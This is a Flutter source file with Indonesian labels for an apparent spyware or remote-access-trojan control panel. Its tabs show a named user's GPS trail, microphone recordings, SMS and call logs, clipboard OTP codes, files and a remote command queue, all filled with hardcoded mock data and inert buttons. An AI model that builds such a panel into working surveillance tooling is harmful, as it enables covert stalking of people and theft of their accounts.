import 'package:flutter/material.dart';

class AdminUserDetailPage extends StatefulWidget {
  @override
  State<AdminUserDetailPage> createState() => _AdminUserDetailPageState();
}

class _AdminUserDetailPageState extends State<AdminUserDetailPage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;
  final List<String> tabNames = [
    "GPS Logging", "Microphone Recording", "Contacts", "SMS Logs", "Send SMS",
    "Call Logs", "Installed Apps", "Stub Permissions", "Clipboard",
    "Notifications", "WiFi Networks", "File Explorer", "Command Queue"
  ];

  @override
  void initState() {
    _tabController = TabController(length: tabNames.length, vsync: this);
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("Detail User - Budi Santoso"),
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabs: tabNames.map((e) => Tab(text: e)).toList(),
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          // 0. GPS Logging
          DataTable(
            columns: const [
              DataColumn(label: Text('Waktu')),
              DataColumn(label: Text('Lat')),
              DataColumn(label: Text('Long')),
            ],
            rows: const [
              DataRow(cells: [
                DataCell(Text('2025-08-01 10:23')),
                DataCell(Text('-6.200')),
                DataCell(Text('106.816')),
              ]),
              DataRow(cells: [
                DataCell(Text('2025-08-01 12:11')),
                DataCell(Text('-6.210')),
                DataCell(Text('106.820')),
              ]),
            ],
          ),
          // 1. Microphone Recording
          ListView(
            children: [
              ListTile(title: Text("2025-08-01 08:00"), subtitle: Text("audio1.mp3")),
              ListTile(title: Text("2025-08-02 14:10"), subtitle: Text("audio2.mp3")),
            ],
          ),
          // 2. Contacts
          DataTable(
            columns: const [
              DataColumn(label: Text('Nama')),
              DataColumn(label: Text('Nomor')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('Andi')), DataCell(Text('081234567890'))]),
              DataRow(cells: [DataCell(Text('Siti')), DataCell(Text('082198765432'))]),
            ],
          ),
          // 3. SMS Logs
          DataTable(
            columns: const [
              DataColumn(label: Text('Arah')),
              DataColumn(label: Text('Nomor')),
              DataColumn(label: Text('Isi')),
              DataColumn(label: Text('Waktu')),
            ],
            rows: const [
              DataRow(cells: [
                DataCell(Text('IN')),
                DataCell(Text('081211122233')),
                DataCell(Text('Halo')),
                DataCell(Text('2025-08-01 09:00')),
              ]),
              DataRow(cells: [
                DataCell(Text('OUT')),
                DataCell(Text('081244455566')),
                DataCell(Text('Siap')),
                DataCell(Text('2025-08-01 09:05')),
              ]),
            ],
          ),
          // 4. Send SMS
          Padding(
            padding: const EdgeInsets.all(16.0),
            child: Column(
              children: [
                TextField(decoration: InputDecoration(labelText: "Nomor Tujuan"), controller: TextEditingController(text: "0812xxxxxxx")),
                TextField(decoration: InputDecoration(labelText: "Isi Pesan"), maxLines: 2),
                SizedBox(height: 12),
                ElevatedButton(onPressed: () {}, child: Text("Kirim SMS")),
              ],
            ),
          ),
          // 5. Call Logs
          DataTable(
            columns: const [
              DataColumn(label: Text('Tipe')),
              DataColumn(label: Text('Nomor')),
              DataColumn(label: Text('Durasi')),
              DataColumn(label: Text('Waktu')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('OUTGOING')), DataCell(Text('081255566677')), DataCell(Text('120')), DataCell(Text('2025-08-01 10:00'))]),
              DataRow(cells: [DataCell(Text('INCOMING')), DataCell(Text('081299988877')), DataCell(Text('60')), DataCell(Text('2025-08-01 13:30'))]),
            ],
          ),
          // 6. Installed Apps
          DataTable(
            columns: const [
              DataColumn(label: Text('App')),
              DataColumn(label: Text('Package')),
              DataColumn(label: Text('Versi')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('WhatsApp')), DataCell(Text('com.whatsapp')), DataCell(Text('2.24.11'))]),
              DataRow(cells: [DataCell(Text('Instagram')), DataCell(Text('com.instagram.android')), DataCell(Text('300.1.0'))]),
            ],
          ),
          // 7. Stub Permissions
          DataTable(
            columns: const [
              DataColumn(label: Text('Permission')),
              DataColumn(label: Text('Status')),
              DataColumn(label: Text('Update')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('GPS')), DataCell(Text('Granted')), DataCell(Text('2025-08-01 14:00'))]),
              DataRow(cells: [DataCell(Text('Microphone')), DataCell(Text('Denied')), DataCell(Text('2025-08-01 14:00'))]),
              DataRow(cells: [DataCell(Text('Contacts')), DataCell(Text('Granted')), DataCell(Text('2025-08-01 14:00'))]),
            ],
          ),
          // 8. Clipboard
          ListView(
            children: [ListTile(title: Text("2025-08-01 11:00: Kode OTP: 123456"))],
          ),
          // 9. Notifications
          ListView(
            children: [ListTile(title: Text("2025-08-01 15:30"), subtitle: Text("WhatsApp - Pesan baru masuk"))],
          ),
          // 10. WiFi Networks
          DataTable(
            columns: const [
              DataColumn(label: Text('SSID')),
              DataColumn(label: Text('Waktu')),
              DataColumn(label: Text('Lokasi')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('RumahAja')), DataCell(Text('2025-08-01 08:00')), DataCell(Text('Jakarta'))]),
              DataRow(cells: [DataCell(Text('Kantor1')), DataCell(Text('2025-07-31 17:00')), DataCell(Text('Jakarta'))]),
            ],
          ),
          // 11. File Explorer
          DataTable(
            columns: const [
              DataColumn(label: Text('Path')),
              DataColumn(label: Text('Ukuran')),
              DataColumn(label: Text('Action')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('/storage/Download/file1.pdf')), DataCell(Text('2MB')), DataCell(TextButton(onPressed: null, child: Text('Download')))]),
              DataRow(cells: [DataCell(Text('/storage/DCIM/photo.jpg')), DataCell(Text('1.2MB')), DataCell(TextButton(onPressed: null, child: Text('Download')))]),
            ],
          ),
          // 12. Command Queue
          DataTable(
            columns: const [
              DataColumn(label: Text('Perintah')),
              DataColumn(label: Text('Status')),
              DataColumn(label: Text('Waktu')),
            ],
            rows: const [
              DataRow(cells: [DataCell(Text('Reboot Device')), DataCell(Text('Selesai')), DataCell(Text('2025-08-01 09:00'))]),
              DataRow(cells: [DataCell(Text('Request Screenshot')), DataCell(Text('Pending')), DataCell(Text('2025-08-01 12:05'))]),
            ],
          ),
        ],
      ),
    );
  }
}